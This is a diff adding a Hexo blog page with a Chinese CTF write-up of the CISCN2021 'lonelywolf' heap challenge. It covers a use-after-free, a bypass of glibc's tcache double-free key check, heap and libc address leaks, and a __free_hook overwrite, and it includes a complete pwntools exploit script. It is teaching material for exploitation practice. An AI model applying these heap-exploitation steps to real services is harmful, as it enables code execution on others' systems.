@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"erkeai.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="静态分析一共主要有四个功能  allocate edit show delete 这里对free后的指针没有置零，所以有UAF漏洞可以利用 利用分析先把功能函数写好，调试一下   可以看到在tcache之前会有维持一个堆块，它会记录tcache的一些信息。圈起来的地方从后往前数，每两位分别代表0x20， 0x30，0x40， 0x50，0x60, 0x70…堆块的数量，图中0x70的位置就是1。然">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2021-lonelywolf">
+<meta property="og:url" content="https://erkeai.github.io/2022/05/17/pwn/CISCN2021-lonelywolf/index.html">
+<meta property="og:site_name" content="hazel&#39;blog">
+<meta property="og:description" content="静态分析一共主要有四个功能  allocate edit show delete 这里对free后的指针没有置零，所以有UAF漏洞可以利用 利用分析先把功能函数写好，调试一下   可以看到在tcache之前会有维持一个堆块，它会记录tcache的一些信息。圈起来的地方从后往前数，每两位分别代表0x20， 0x30，0x40， 0x50，0x60, 0x70…堆块的数量，图中0x70的位置就是1。然">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517164531139.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165202261.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165421632.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165503078.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165824425.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517194259519.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517194230526.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517200804803.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517203200966.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517210209735.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517204504882.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517210543689.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517211234211.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517211215407.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518111043647.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518115605012.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518115857937.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518120130377.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518120330284.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518121522130.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518123027216.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518122542691.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518123534208.png">
+<meta property="article:published_time" content="2022-05-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-18T06:20:34.191Z">
+<meta property="article:author" content="ZouFeIYu">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="tcache">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517164531139.png">
+
+<link rel="canonical" href="https://erkeai.github.io/2022/05/17/pwn/CISCN2021-lonelywolf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CISCN2021-lonelywolf | hazel'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">hazel'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">96</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">95</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/05/17/pwn/CISCN2021-lonelywolf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
+      <meta itemprop="name" content="ZouFeIYu">
+      <meta itemprop="description" content="reading, coding, travelling">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hazel'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2021-lonelywolf
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-17 00:00:00" itemprop="dateCreated datePublished" datetime="2022-05-17T00:00:00+08:00">2022-05-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-18 14:20:34" itemprop="dateModified" datetime="2022-05-18T14:20:34+08:00">2022-05-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>一共主要有四个功能</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517164531139.png" alt="image-20220517164531139"></p>
+<h4 id="allocate"><a href="#allocate" class="headerlink" title="allocate"></a>allocate</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165202261.png" alt="image-20220517165202261"></p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165421632.png" alt="image-20220517165421632"></p>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165503078.png" alt="image-20220517165503078"></p>
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517165824425.png" alt="image-20220517165824425"></p>
+<p>这里对free后的指针没有置零，所以有UAF漏洞可以利用</p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>先把功能函数写好，调试一下</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517194259519.png" alt="image-20220517194259519"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517194230526.png" alt="image-20220517194230526"></p>
+<p>可以看到在tcache之前会有维持一个堆块，它会记录tcache的一些信息。圈起来的地方从后往前数，每两位分别代表0x20， 0x30，0x40， 0x50，0x60, 0x70…堆块的数量，图中0x70的位置就是1。然后从<code>0x55e182cbd050</code>处开始记录0x20开始的堆块大小的地址，如图所示，0x70大小堆块的地址就是<code>0x000055e182cbd260</code></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517200804803.png" alt="image-20220517200804803"></p>
+<p>该堆块的key值如下</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517203200966.png" alt="image-20220517203200966"></p>
+<p>可以看一下知识点部分的绕过知识，其实我们修改key值直接不进入那个检测循环就可以绕过</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517210209735.png" alt="image-20220517210209735"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517204504882.png" alt="image-20220517204504882"></p>
+<h4 id="泄露基址"><a href="#泄露基址" class="headerlink" title="泄露基址"></a>泄露基址</h4><p>查看一下堆块内容，<strong>因为double free后其fd指针指向的是自己的地址，所以由此可以泄露堆块基址</strong>其中圈起来的地方记录的就是堆块的地址，如果将该地址打印出来我们就知道了该堆块地址，进而知道堆块基址</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517210543689.png" alt="image-20220517210543689"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517211234211.png" alt="image-20220517211234211"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220517211215407.png" alt="image-20220517211215407"></p>
+<p>到这里就泄露了堆块基址，接下来就是泄露libc基址，因为首先程序控制了我们申请堆块的大小,我们需要申请一个释放后能放入unsortedbin的堆块，就需要考虑到tcache有个最前面的控制堆块，大小是0x251。</p>
+<p><strong>这时可以修改fd指针让其指向控制堆块（+0x10是因为tcache中fd指向的直接就是数据区），然后再将堆块申请回来，修改该bin上的chunk数量为7，然后再将该堆块free掉，该堆块就会放到unsortedbin中。</strong></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518111043647.png" alt="image-20220518111043647"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518115605012.png" alt="image-20220518115605012"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518115857937.png" alt="image-20220518115857937"></p>
+<p>free之后</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518120130377.png" alt="image-20220518120130377"></p>
+<p>查看一下（在前面一章有提到过有关mainarea的知识）</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518120330284.png" alt="image-20220518120330284"></p>
+<p>one_gadget如下</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518121522130.png" alt="image-20220518121522130"></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>填充的部分意思是，将0x20大小的堆块填充数量为3，将堆块首地址改为free_hook地址，所以当我们申请一个堆块的时候，就会将free_hook分配给我们</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518123027216.png" alt="image-20220518123027216"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518122542691.png" alt="image-20220518122542691"></p>
+<p>在将其地址赋值为one_gadget之前是空的</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220518123534208.png" alt="image-20220518123534208"></p>
+<p>所以将其赋值为one_gadget后就会进入到该函数，执行one_gadget</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./lonelywolf&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_base-&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(heap_base+<span class="number">0x10</span>))<span class="comment">#fd point control chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>) <span class="comment"># control chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span>  - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x10a41c</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base-&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;\x03&#x27;</span> +<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x3f</span> + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><ol>
+<li>tcache机制的主体是tcache_perthread_struct结构体，其中包含单链表tcache_entry</li>
+<li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是<strong>0x20-0x410</strong>，也就是说我们必须要<strong>malloc size≤0x408</strong>的chunk</li>
+<li>每一个单链表tcache Bin中默认允许存放的chunk块最大数量是<strong>7</strong></li>
+<li>tcache指针指向的是<strong>内容位置</strong>，管理结构体前几排记录大小，后几排记录<strong>不同大小链表的头号chunk地址</strong></li>
+<li>在申请chunk块时，如果<code>tcache Bin</code>中有符合要求的chunk，则直接返回；如果在fastbin中有符合要求的chunk，则先将对应fastbin中其他chunk加入相应的tcache Bin中，直到达到tcache Bin的数量上限，然后返回符合符合要求的chunk；如果在smallbin中有符合要求的chunk，则与fastbin相似，先将双链表中的其他剩余chunk加入到tcache中，再进行返回</li>
+<li>在释放chunk块时，如果chunk size符合tcache Bin要求且相应的tcache Bin没有装满，则直接加入相应的tcache Bin</li>
+<li>与fastbin相似，在tcache Bin中的chunk不会进行合并，因为它们的<code>pre_inuse</code>位会置成1</li>
+</ol>
+<p>tcache为了检查doublefree，增加了如下代码段</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) <span class="built_in">chunk2mem</span> (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<span class="comment">////检测被free的chunk bk是否指向tcache </span></span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    <span class="built_in">LIBC_PROBE</span> (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)<span class="comment">////遍历对应tc_idx的tcache查看要free的chunk在链表中是否存在</span></span><br><span class="line">		<span class="built_in">malloc_printerr</span> (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="built_in">tcache_put</span> (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里会判断<strong>tcache</strong>的<strong>key</strong>字段的值。而每一个被释放的<strong>tcache</strong>，其<strong>key</strong>都会按照如下代码，被设置为固定的值，从而尽可能避免了<strong>double free</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) <span class="built_in">chunk2mem</span> (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>**2.27-2.31对double free的检测都很简单,即先检查释放的chunk 的bk不能指向tcache结构体，且不能在对应tcache里存在</p>
